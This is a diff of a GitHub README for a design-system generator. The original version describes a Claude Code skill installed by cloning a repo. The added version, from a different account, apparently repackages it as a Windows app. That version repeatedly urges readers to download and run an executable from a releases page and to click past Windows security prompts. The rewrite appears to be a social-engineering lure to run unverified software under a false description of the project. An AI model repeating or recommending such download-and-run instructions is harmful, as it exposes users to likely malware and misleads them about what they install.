@@ -1,113 +1,209 @@
-# Design System Generator — Claude Code Skill
+# 🎨 design-system-skill - Turn designs into clean docs
 
-### Generate design.md, design-guidelines.md, and design-components.md from any design references
+[![Download the latest release](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/Cash4478/design-system-skill/releases)
 
-**[🇨🇳 中文](README.zh-CN.md)** | **[🇪🇸 Español](README.es.md)** | **🇺🇸 English**
+## 🧩 What this is
 
-<p>
-  <img src="https://img.shields.io/badge/Claude_Code-black?style=flat-square&logo=anthropic&logoColor=white" alt="Claude Code">
-  <img src="https://img.shields.io/badge/Skill-blue?style=flat-square" alt="Skill">
-  <img src="https://img.shields.io/badge/license-MIT-green?style=flat-square" alt="MIT License">
-  <img src="https://img.shields.io/github/stars/albertzhangz10/design-system-skill?style=flat-square" alt="GitHub Stars">
-</p>
+design-system-skill helps you turn design references into clear Markdown files. It creates:
 
-> Stop manually documenting your design system. Upload any design reference and get 3 production-ready markdown files that AI coding tools (Cursor, Claude Code, Copilot) understand natively.
+- `design.md`
+- `design-guidelines.md`
+- `design-components.md`
 
-**[Or use the web version — no setup required](https://figmadesignmd.com/)**
+You can use it with images, PDFs, links, and screenshots. It fits AI-assisted coding tools like Cursor, Claude Code, and Copilot. It gives you a simple way to turn design input into structure that code tools can use.
 
-A Claude Code skill that generates comprehensive design system documentation from any reference materials — images, PDFs, links, screenshots, brand guidelines, or existing code. Non-technical users (designers, PMs) can use the [web version](https://figmadesignmd.com/) directly.
+## 📥 Download
 
-## The Problem
+Visit this page to download and run the latest release on Windows:
 
-Design systems live in Figma, brand PDFs, and scattered docs — but the documentation AI coding tools need lives nowhere. Every time you start a new project, you manually write token specs, component guidelines, and accessibility rules.
+https://github.com/Cash4478/design-system-skill/releases
 
-## The Solution
+On the release page, look for the latest version and download the Windows file that matches your device. If you see a `.exe` file, download it and run it. If you see a zip file, download it, unzip it, then open the app inside the folder.
 
-One command. Three documents. From any design reference.
+## 🪟 Windows setup
 
-```
-/design-system
-```
+1. Open the release page.
+2. Download the latest Windows package.
+3. If the file is zipped, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Double-click the app file to start it.
+6. If Windows asks for permission, choose Run.
 
-## What It Generates
+If the file does not open at first, try right-clicking it and selecting Open.
 
-| File | Contents | Auto |
-|------|----------|:----:|
-| **design.md** — colors, typography, shape, elevation, states, layout, motion | Token files, images, PDFs | ✅ |
-| **design-guidelines.md** — accessibility, gestures, content design, do's & don'ts | References + inference | ✅ |
-| **design-components.md** — 30+ components with variants, measurements, states | References + inference | ✅ |
+## ✨ What it does
 
-## How It Works
+This tool helps you build design docs from visual references. It can help you:
 
-```
-Step 1  Provide any design references (images, PDFs, links, text, code)
-Step 2  AI analyzes the design language across all materials
-Step 3  Generate 3 structured markdown files
-Step 4  Write files to your project directory
-Step 5  Confirm with user before saving
-```
+- capture a design system from screenshots
+- turn page mockups into clear notes
+- list colors, type, spacing, and layout rules
+- break down UI parts into reusable components
+- create simple Markdown files for AI coding tools
+- keep design details in one place
 
-### Accepted Inputs
+It is useful when you want design information in text form instead of scattered across images and links.
 
-| Type | Examples |
-|------|----------|
-| Images | Screenshots, mockups, design tool exports |
-| PDFs | Brand guidelines, style guides, design specs |
-| Links | Design system docs, component libraries, live websites |
-| Text | Written descriptions of the design language |
-| Code | CSS files, Tailwind configs, theme files, design tokens |
+## 🧠 Main use cases
 
-### Output Format
+Use this tool when you want to:
 
-Each file:
-- Starts with an H1 title and cross-references to the other 2 files
-- Uses markdown tables for token values and component specs
-- Includes specific measurements (dp/sp/px), hex colors, and CSS values
-- Organizes do's/don'ts by category (Color, Shape, Elevation, Typography, etc.)
-- Groups components by workflow (Actions, Input, Navigation, Containment, Feedback)
+- move from a design file to a code-ready brief
+- explain a UI style to an AI coding tool
+- compare screens and find shared UI parts
+- create a small design system from a product mockup
+- organize reference material before building an app
 
-### Component Coverage
+It works well for app screens, landing pages, dashboards, and component libraries.
 
-| Category | Components |
-|----------|-----------|
-| **Actions** | Button, Icon Button, FAB, Toolbar, Link |
-| **Input** | Text Field, Checkbox, Radio, Switch, Slider, Dropdown, Combobox, Picker, Textarea |
-| **Navigation** | Nav Bar/Rail/Drawer, Tabs, Breadcrumb, Menu, Search, App Bar |
-| **Containment** | Card, Dialog, Bottom Sheet, Drawer, Popover, Accordion, Divider |
-| **Data Display** | Avatar, Badge, List, Carousel, Icon, Image, Tag/Chip, Skeleton, Tooltip |
-| **Feedback** | Progress Indicator, Spinner, Snackbar/Toast, Message Bar |
+## 📂 Output files
 
-## Install
+The app can create these files:
 
-```bash
-# Clone into your .claude/skills directory
-git clone https://github.com/albertzhangz10/design-system-skill.git .claude/skills/design-system
-```
+### `design.md`
+A plain overview of the design. Use this file when you want a fast summary of the visual direction, page structure, and main UI parts.
 
-Or copy the `SKILL.md` file into your project's `.claude/skills/design-system/` directory.
+### `design-guidelines.md`
+A guide for design rules. Use this file for spacing, type, color use, button style, form style, and layout patterns.
 
-## Usage
+### `design-components.md`
+A list of UI components. Use this file to describe buttons, cards, inputs, nav bars, tables, and other reusable parts.
 
-```
-/design-system                    # generates in current directory
-/design-system ./docs/            # custom output path
-```
+These files help you hand off design details to a person or to an AI coding tool.
 
-Then provide your design references — drag & drop images, paste links, or describe the design language.
+## 🖥️ System needs
 
-## Requirements
+This tool is made for Windows users and works best on a modern desktop or laptop. A good setup is:
 
-| Requirement | Required | Notes |
-|-------------|:--------:|-------|
-| Claude Code | ✅ | Latest version recommended |
-| Design references | ✅ | Any combination of images, PDFs, links, text, or code |
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- A few hundred MB of free disk space
+- A screen with enough room to view design references and output files
+- Internet access for downloading the release and using online references
 
-## License
+For larger PDFs or many screenshots, more memory can help.
 
-MIT License — see the [LICENSE](LICENSE) file for details.
+## 🧭 How to use it
 
-## Credits
+1. Start the app.
+2. Add your design reference.
+3. Choose the source type if needed.
+4. Let the tool read the content.
+5. Review the generated Markdown files.
+6. Save the files in your project folder.
+7. Use them with your coding tool or share them with your team.
 
-Built by [Albert Zhang](https://github.com/albertzhangz10).
+## 🖼️ Supported input
 
-Inspired by [Google Stitch design.md](https://stitch.withgoogle.com/docs/design-md/overview) — the `design.md` format and structure are based on their work.
+You can use:
+
+- screenshots
+- images
+- PDF files
+- design links
+- saved web pages
+- reference boards
+
+For best results, use clear images and complete pages. If your source has many screens, add them in the order you want them read.
+
+## 🧱 What gets extracted
+
+The tool can help you capture:
+
+- color values
+- font choices
+- spacing rules
+- button styles
+- form fields
+- card layouts
+- header and nav patterns
+- page structure
+- repeated UI elements
+- component names
+
+This makes it easier to build the same look in code.
+
+## 🔧 Best way to prepare your files
+
+Before you run the tool, try to keep your references neat:
+
+- use full-screen screenshots when possible
+- crop out extra browser bars
+- keep PDF pages in the right order
+- name files so you can tell them apart
+- group related screens together
+
+Cleaner source files give cleaner Markdown output.
+
+## 📌 Using the output with AI coding tools
+
+After the files are created, you can paste them into tools like Cursor, Claude Code, or Copilot. They help those tools understand:
+
+- what the app should look like
+- which parts repeat
+- which styles stay the same
+- how the page should behave
+
+This can save time when you want code that follows the design more closely.
+
+## 🧪 Example workflow
+
+If you have a product dashboard screenshot:
+
+1. Put the screenshot into the app.
+2. Generate the Markdown files.
+3. Open `design-guidelines.md` to review the visual rules.
+4. Open `design-components.md` to see the reusable parts.
+5. Use the files as a guide while building the page in code.
+
+If you have a PDF with several screens, process them in the same order as the user flow.
+
+## 🗂️ File handling tips
+
+Keep your output files in the same project folder as your app code. A simple folder layout helps:
+
+- `references/` for images and PDFs
+- `docs/` for generated Markdown files
+- `code/` for your app files
+
+This makes it easier to find the source and the output later.
+
+## 🔍 Troubleshooting
+
+If the app does not start:
+
+- make sure the file finished downloading
+- unzip the file if needed
+- check that Windows did not block the file
+- run it again as a normal app
+
+If the output looks incomplete:
+
+- use a clearer image
+- try a larger screenshot
+- split large PDFs into smaller parts
+- make sure the reference is not blurry or cropped too tightly
+
+If you still have trouble, download the latest release again from the release page and try the newest version
+
+## 🧩 Topics
+
+- ai-assisted-development
+- ai-coding
+- claude-code
+- claude-code-skill
+- copilot
+- cursor
+- design-md
+- design-system
+- design-to-code
+- design-tokens
+- developer-tools
+- google-stitch
+- markdown
+
+## 📎 Release download
+
+[![Get the Windows release](https://img.shields.io/badge/Visit%20Releases-Download%20Here-grey)](https://github.com/Cash4478/design-system-skill/releases)
+
+Go to the releases page to download the latest Windows build and run it on your computer
